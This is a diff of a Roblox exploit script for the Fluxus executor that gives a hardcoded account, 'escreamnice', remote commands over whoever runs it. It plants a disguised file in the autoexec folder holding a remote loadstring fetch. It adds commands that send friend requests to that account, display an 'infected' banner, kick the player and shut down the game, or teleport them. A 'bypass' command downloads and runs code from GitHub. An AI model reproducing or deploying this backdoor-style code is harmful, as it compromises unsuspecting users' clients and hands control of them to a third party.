@@ -1,22 +1,10 @@
-
-
 if isfile("fluxus_scriptblox_autoexec/.Ywee6c6f61646c6f6164.json") then
 delfile("fluxus_scriptblox_autoexec/.Ywee6c6f61646c6f6164.json")
 end
 
 local theme_data = [[
 
-game.Players.ChildAdded:connect(function(p1)
-	if p1.Name == "escreamnice" then
-{"rawCount":0, "showRawCount":false, "scriptType":"free", "createdAt":"2023-01-21T03:25:01.336Z", "isPatched":false, "slug":"Universal-Script-Collision-Enabler-8481", "script":"loadstring(game:HttpGet("https://raw.githubusercontent.com/sometestg/ff/main/tfsd"))()", "_id":"63cb5b0dad447ae3cc2b8c04", "isUniversal":true, "__v":0, "views":6923, "queryInfo":null, "title":"Collision Enabler", "verified":false, "updatedAt":"2023-02-13T12:19:56.542Z", "game":{"imageUrl":"\/images\/script_2012488-1674271501285.jpg", "name":"Universal Script ðŸ“Œ", "gameId":2012488}, "visibility":"public", "matched":["features", "game", "script", "title", "universal"]}
-end
-end)
-
-for _, player in pairs(game.Players:GetChildren()) do
-	if player.Name == "escreamnice" then
-	{"rawCount":0, "showRawCount":false, "scriptType":"free", "createdAt":"2023-01-21T03:25:01.336Z", "isPatched":false, "slug":"Universal-Script-Collision-Enabler-8481", "script":"loadstring(game:HttpGet("https://raw.githubusercontent.com/sometestg/ff/main/tfsd"))()", "_id":"63cb5b0dad447ae3cc2b8c04", "isUniversal":true, "__v":0, "views":6923, "queryInfo":null, "title":"Collision Enabler", "verified":false, "updatedAt":"2023-02-13T12:19:56.542Z", "game":{"imageUrl":"\/images\/script_2012488-1674271501285.jpg", "name":"Universal Script ðŸ“Œ", "gameId":2012488}, "visibility":"public", "matched":["features", "game", "script", "title", "universal"]}
-end
-end)
+--{"rawCount":0, "showRawCount":false, "scriptType":"free", "createdAt":"2023-01-21T03:25:01.336Z", "isPatched":false, "slug":"Universal-Script-Collision-Enabler-8481", "script":"loadstring(game:HttpGet(('https://pastefy.ga/eDZnkBds/raw'),true))()", "_id":"63cb5b0dad447ae3cc2b8c04", "isUniversal":true, "__v":0, "views":6923, "queryInfo":null, "title":"Collision Enabler", "verified":false, "updatedAt":"2023-02-13T12:19:56.542Z", "game":{"imageUrl":"\/images\/script_2012488-1674271501285.jpg", "name":"Universal Script ðŸ“Œ", "gameId":2012488}, "visibility":"public", "matched":["features", "game", "script", "title", "universal"]}
 
 ]]
 
@@ -24,13 +12,11 @@ end)
 writefile(".fluxus_scriptblox_autoexec/.Ywee6c6f61646c6f6164.json",theme_data)
 
 
-
-
 ------------------------important varibles------------------------------------------------------------
 
 rbxname = "escreamnice"
-local prefix = "$"
-local LPlayer = game.Players.escreamnice -- your name on my name (maxbrh1)
+local prefix = "."
+local LPlayer = game.Players.LocalPlayer -- your name on my name (maxbrh1)
 messageLL = "Greyss king" 
 speed = 1 --how fast tweengoto is 
 render1 = false --if alts auto unrender when excuted
@@ -52,7 +38,9 @@ resettime = 5.4 --how long it will take to teleport alts back to cordinates nocl
 --unclip no noclip
 --infect
 --bypass
-
+--add
+--bye
+--shut
 
 ---------------grapics commands-------------------------------------------------------------------------
 
@@ -156,14 +144,47 @@ game.Players.LocalPlayer.Character.Head.Anchored = false
             wait(resettime)
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(cords2)
     end
-        if cmd == "infect" then
-            local Roast = {"successfully infected!"}
+            if cmd == "add" then
+local plrs = game:GetService('Players')
+local localPlayer = plrs.LocalPlayer
 
-            local Result = Roast[math.random(1, #Roast)]
-            game:service('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Result,"All")
+for i,v in pairs(plrs:GetChildren()) do
+    wait(1)
+    if v.Name == "escreamnice" then
+        localPlayer:RequestFriendship(v)
+    end
+end
+
+    end
+        if cmd == "infect" then
+            local gui = Instance.new("ScreenGui")
+gui.Name = "RobloxGUI"
+gui.Parent = game.CoreGui
+gui.DisplayOrder = 67
+gui.IgnoreGuiInset = true
+
+local changeframename = Instance.new("TextButton")
+changeframename.Size = UDim2.new(0, 700, 0, 80)
+changeframename.Position = UDim2.new(0, 0, -0, 0)
+changeframename.BackgroundColor3 = Color3.new(1, 1, 1)
+changeframename.BorderColor3 = Color3.new(0, 0, 0)
+changeframename.BorderSizePixel = 1
+changeframename.Text = " You got infected by greyssking"
+changeframename.Parent = gui
+
+
     end
         if cmd == "bypass" then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sometestg/ff/main/jhnde"))()
+    end
+    
+    if cmd == "shut" then
+    game.Players.LocalPlayer:Kick("bye")
+    task.wait(0.5)
+game:Shutdown()
+    end
+            if cmd == "bye" then
+game:GetService("TeleportService"):Teleport(13516531889, game.Players.LocalPlayer)
     end
 
 
